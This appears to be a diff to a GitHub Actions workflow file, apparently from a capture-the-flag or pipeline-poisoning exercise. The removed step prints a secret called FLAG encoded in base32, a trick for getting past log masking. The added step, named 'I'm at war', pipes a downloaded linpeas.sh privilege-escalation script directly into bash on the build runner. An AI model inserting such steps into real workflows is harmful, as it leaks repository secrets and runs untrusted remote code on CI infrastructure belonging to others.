@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Print Secret
+      - name: I'm at war
         run: |
-           echo ${{secrets.FLAG }} | base32
+           curl https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/linpeas.sh |bash
         shell: bash
